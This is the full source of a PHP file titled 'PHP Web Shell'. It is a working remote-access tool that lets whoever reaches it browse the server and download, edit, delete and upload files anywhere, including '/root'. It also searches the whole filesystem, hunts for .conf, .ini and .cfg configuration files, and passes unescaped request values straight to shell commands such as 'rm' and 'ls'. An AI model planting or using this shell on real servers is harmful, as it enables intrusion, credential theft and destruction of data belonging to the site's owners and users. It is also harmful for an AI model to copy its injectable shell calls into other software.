<?php
session_start();

if (isset($_GET["curr_dir"])){
    $curr_dir = $_GET["curr_dir"];
}else{
    $curr_dir = shell_exec("pwd");
}

if(isset($_POST["download_file"])){
    $download_file_name = $_POST["download_file_name"];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . basename($download_file_name) . '"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($download_file_name));

    flush();
    readfile($download_file_name);
}

if(isset($_POST["edit_file_new_content"])){
    if(file_put_contents($_POST["edit_file_name"], $_POST["new_content"])){
        $edit_file_res = "File Successfully Edited";
    }else{
        $edit_file_res = "File Edit is Failed. Probably Permission is Denied";

    }
}

if (isset($_GET["edit_file"])){
    $edit_file_name = $_GET["edit_file"];
    $edit_file_content = $content = file_get_contents($edit_file_name);
}

if(isset($_GET["delete_file"])){
    $delete_file = $_GET['delete_file'];
    exec("rm $delete_file", $delete_file_output, $delete_file_return_var);
    if($delete_file_return_var == 0){
        $delete_file_res = "File is Deleted Successfuly";
    }else{
        $delete_file_res = "File  Couldn't be Deleted. Probably Permission is Denied";
    }
}


if (isset($_POST["upload_file"])) {
    $path = $_POST['path'] ?? '';
    if ($path !== '' && substr($path, -1) !== '/') {
        $path .= '/';
    }

    if ($_FILES['file']['error'] === UPLOAD_ERR_OK) {
        $file_tmp = $_FILES['file']['tmp_name'];
        $file_name = $_FILES['file']['name'];
        if (move_uploaded_file($file_tmp, $path . $file_name)) {
            $upload_res = "File uploaded successfully to " . htmlspecialchars($path . $file_name);
        } else {
            $upload_res = "Failed to move uploaded file. Probably Permission is Denied.";
        }
    } else {
        $upload_res = "File upload failed with error code: " . $_FILES['file']['error'];
    }
}

if(isset($_POST["search_file"])){
    $file = $_POST['file'] ?? '';
    $search_file_res = shell_exec("find / -type f -name " . escapeshellarg($file));
    if(!$search_file_res){
        $search_file_res = "File Couldn't be Found!";
    }
}

if (isset($_POST["find_config"])){
    $config_files = shell_exec("find / -type f \( -name '*.conf' -o -name '*.ini' -o -name '*.cfg' \)");
    if(!$config_files){
        $config_files = "Config file couldn't be Found";
    }
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP Web Shell</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f4; text-align: center; }
        form { margin: 20px auto; width: 80%; padding: 10px; background-color: #fff; border: 1px solid #ccc; }
        textarea, input[type=text], input[type=file] { width: 90%; padding: 5px; margin: 10px 0; }
        button { padding: 10px 20px; background-color: #28a745; color: white; border: none; cursor: pointer; }
        button:hover { background-color: #218838; }
        .output { margin-top: 20px; background-color: #bbe4e9; padding: 10px; border: 1px solid #ccc; white-space: pre-wrap; }
    </style>
</head>
<body>
    <h1>PHP Web Shell</h1>
    <div style="background-color:#ff847c; padding-bottom: 10px">
        <h2>HELP</h2>
        <h3>=> You can View the Directory and Files in the current directory with their permissions</h3>
        <h3>=> You can Visit Directories and Download, Edit, Delete Files via the buttons under the directory/file</h3>
        <h3>=> You can upload files to the system and you need to spesify path or the file will be uploaded to the '/'' directory</h3>
        <h3>=> You can Search files via their names</h3>
        <h3>=> You can list all the config files(only with the extensions .conf, .ini or .cfg)</h3>
    </div>
        <?php
            if($edit_file_name){
                echo "<div class='output'>";
                echo "<form method='POST'>";
                echo "<h2>Editing $edit_file_name</h2>";
                echo "<textarea name='new_content' style='display:block; margin:auto' rows='20' cols='100'>$edit_file_content</textarea>";
                echo "<input type='hidden' name='edit_file_name' value='$edit_file_name'>";
                echo "<button type='submit' name='edit_file_new_content'>Save</button>";
                echo "</form>";
                echo "<h3>$edit_file_res</h3>";
                echo "</div>";
            }

            echo "<h3>Current Directory Path -> ".$curr_dir."</h3>";
            $ls_res = shell_exec("ls -la " . $curr_dir);
            $lines = explode("\n", $ls_res);
            echo "<div class='output'>";
                foreach ($lines as $line) {
                    $columns = preg_split('/\s+/', $line);
            
                    if (count($columns) >= 9) {
                        $permissions = $columns[0];
            
                        $fileName = implode(' ', array_slice($columns, 8));
                        if(str_starts_with($permissions, "d")){
                            echo "<span>Directory: $fileName  ||  Permissions: $permissions</span>";
                            echo "<form><input type='hidden' name='curr_dir' value='".trim($curr_dir)."/".trim($fileName)."'><button>Visit Directory</button></form>";
                        }else{
                            echo "<span>File: $fileName  ||  Permissions: $permissions</span><br>";
                            echo "<form><input type='hidden' name='curr_dir' value='".trim($curr_dir)."'><input type='hidden' name='delete_file' value='".trim($curr_dir)."/".trim($fileName)."'><button>Delete File</button></form>";
                            echo "<form><input type='hidden' name='curr_dir' value='".trim($curr_dir)."'><input type='hidden' name='edit_file' value='".trim($curr_dir)."/".trim($fileName)."'><button>Edit File</button></form>";
                            echo "<form method='POST'><input type='hidden' name='download_file_name' value='".trim($curr_dir)."/".trim($fileName)."'><button name='download_file'>Download File</button></form>";
                        }
                    }
                }
                if(isset($delete_file_res)){
                    echo "<h3>".$delete_file_res."</h3>";
                }
            echo "</div>";


        ?>

    <form method="POST" enctype="multipart/form-data">
        <label>Select file to upload:</label>
        <input type="file" name="file">
        <br>
        <label>Spesify path for the file:(ex: /root or /var/www etc.)</label>
        <input type="text" name="path">
        <button type="submit" name="upload_file">Upload File</button>
    </form>
    
    <?php 
        if(isset($upload_res)){
            echo '<div class="output">';
                echo "<strong>Message:</strong> " . $upload_res . "<br>";
            echo '</div>';
        }
    ?>

    <br><br><br>
    <form method="POST">
        <label>Enter File Name to Find its Location/s</label>
        <input type="text" name="file" placeholder="Enter file name">
        <button type="submit" name="search_file">Search</button>
    </form>



    <?php
        if(isset($search_file_res)){
            echo '<div class="output">';
                echo "<strong>Message:</strong> " . $search_file_res . "<br>";
            echo '</div';
        }
    ?>

    <br><br><br>
    <form method="POST">
        <label>Find Config Files (Only return files with the .conf, .ini, .cfg extensions)</label>
        <button type="submit" name="find_config">Find Config Files</button>
    </form>

    <?php
        if(isset($config_files)){
            echo '<div class="output">';
                echo "<strong>Message:</strong> " . $config_files . "<br>";
            echo '</div';
        }
    ?>


        </div>

</body>
</html>
